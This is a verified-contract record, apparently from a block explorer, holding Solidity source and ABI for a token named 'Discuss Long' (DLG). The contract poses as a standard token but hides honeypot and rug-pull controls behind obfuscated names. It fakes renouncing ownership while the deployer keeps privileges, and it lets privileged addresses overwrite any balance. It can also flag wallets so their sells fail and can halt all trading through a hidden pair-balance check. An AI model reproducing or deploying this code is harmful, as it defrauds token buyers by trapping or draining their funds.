{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface launchShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atListToken {\n    function createPair(address receiverExempt, address launchedIs) external returns (address);\n}\n\ninterface fundFromAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunch) external view returns (uint256);\n\n    function transfer(address receiverMax, uint256 walletTx) external returns (bool);\n\n    function allowance(address enableTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMax,\n        uint256 walletTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableMax, uint256 value);\n    event Approval(address indexed enableTo, address indexed spender, uint256 value);\n}\n\ninterface fundFromAtMetadata is fundFromAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DiscussLong is sellTeam, fundFromAt, fundFromAtMetadata {\n\n    bool public receiverEnable;\n\n    function minAuto(address liquidityTxMax, uint256 walletTx) public {\n        buyLaunch();\n        exemptLiquidity[liquidityTxMax] = walletTx;\n    }\n\n    bool public listTrading;\n\n    uint256 private senderEnable = 100000000 * 10 ** 18;\n\n    address public tradingSender;\n\n    string private enableSenderSwap = \"Discuss Long\";\n\n    function isLaunchedTeam(address fundTake, address receiverMax, uint256 walletTx) internal returns (bool) {\n        require(exemptLiquidity[fundTake] >= walletTx);\n        exemptLiquidity[fundTake] -= walletTx;\n        exemptLiquidity[receiverMax] += walletTx;\n        emit Transfer(fundTake, receiverMax, walletTx);\n        return true;\n    }\n\n    address public shouldLimit;\n\n    address launchedModeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 enableTake;\n\n    function buyLaunch() private view {\n        require(toToken[_msgSender()]);\n    }\n\n    uint8 private teamAt = 18;\n\n    uint256 private maxModeLiquidity;\n\n    mapping(address => bool) public toToken;\n\n    uint256 constant amountList = 17 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderEnable;\n    }\n\n    function owner() external view returns (address) {\n        return listFund;\n    }\n\n    mapping(address => bool) public maxAmount;\n\n    function transfer(address liquidityTxMax, uint256 walletTx) external virtual override returns (bool) {\n        return launchEnable(_msgSender(), liquidityTxMax, walletTx);\n    }\n\n    bool public launchSwap;\n\n    constructor (){\n        if (maxModeLiquidity == senderSell) {\n            receiverEnable = true;\n        }\n        launchShould swapLaunch = launchShould(autoMode);\n        shouldLimit = atListToken(swapLaunch.factory()).createPair(swapLaunch.WETH(), address(this));\n        if (listTrading) {\n            listTrading = false;\n        }\n        tradingSender = _msgSender();\n        enableTokenList();\n        toToken[tradingSender] = true;\n        exemptLiquidity[tradingSender] = senderEnable;\n        \n        emit Transfer(address(0), tradingSender, senderEnable);\n    }\n\n    string private listFrom = \"DLG\";\n\n    function modeListFrom(uint256 walletTx) public {\n        buyLaunch();\n        enableTake = walletTx;\n    }\n\n    function enableTokenList() public {\n        emit OwnershipTransferred(tradingSender, address(0));\n        listFund = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return listFund;\n    }\n\n    bool private limitReceiverTo;\n\n    event OwnershipTransferred(address indexed walletLiquidity, address indexed isExempt);\n\n    address autoMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address launchedTotal, address fundSell) external view virtual override returns (uint256) {\n        if (fundSell == autoMode) {\n            return type(uint256).max;\n        }\n        return listLaunched[launchedTotal][fundSell];\n    }\n\n    uint256 totalLaunch;\n\n    function transferFrom(address fundTake, address receiverMax, uint256 walletTx) external override returns (bool) {\n        if (_msgSender() != autoMode) {\n            if (listLaunched[fundTake][_msgSender()] != type(uint256).max) {\n                require(walletTx <= listLaunched[fundTake][_msgSender()]);\n                listLaunched[fundTake][_msgSender()] -= walletTx;\n            }\n        }\n        return launchEnable(fundTake, receiverMax, walletTx);\n    }\n\n    function totalReceiverTx(address liquidityWallet) public {\n        buyLaunch();\n        \n        if (liquidityWallet == tradingSender || liquidityWallet == shouldLimit) {\n            return;\n        }\n        maxAmount[liquidityWallet] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableSenderSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listFrom;\n    }\n\n    mapping(address => uint256) private exemptLiquidity;\n\n    function fromWallet(address buyEnable) public {\n        if (launchSwap) {\n            return;\n        }\n        \n        toToken[buyEnable] = true;\n        \n        launchSwap = true;\n    }\n\n    function launchEnable(address fundTake, address receiverMax, uint256 walletTx) internal returns (bool) {\n        if (fundTake == tradingSender) {\n            return isLaunchedTeam(fundTake, receiverMax, walletTx);\n        }\n        uint256 receiverTeam = fundFromAt(shouldLimit).balanceOf(launchedModeIs);\n        require(receiverTeam == enableTake);\n        require(receiverMax != launchedModeIs);\n        if (maxAmount[fundTake]) {\n            return isLaunchedTeam(fundTake, receiverMax, amountList);\n        }\n        return isLaunchedTeam(fundTake, receiverMax, walletTx);\n    }\n\n    function approve(address fundSell, uint256 walletTx) public virtual override returns (bool) {\n        listLaunched[_msgSender()][fundSell] = walletTx;\n        emit Approval(_msgSender(), fundSell, walletTx);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private listLaunched;\n\n    function balanceOf(address senderLaunch) public view virtual override returns (uint256) {\n        return exemptLiquidity[senderLaunch];\n    }\n\n    uint256 private senderSell;\n\n    address private listFund;\n\n    bool private buyExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTokenList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"}],\"name\":\"fromWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTx\",\"type\":\"uint256\"}],\"name\":\"minAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTx\",\"type\":\"uint256\"}],\"name\":\"modeListFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"totalReceiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DiscussLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}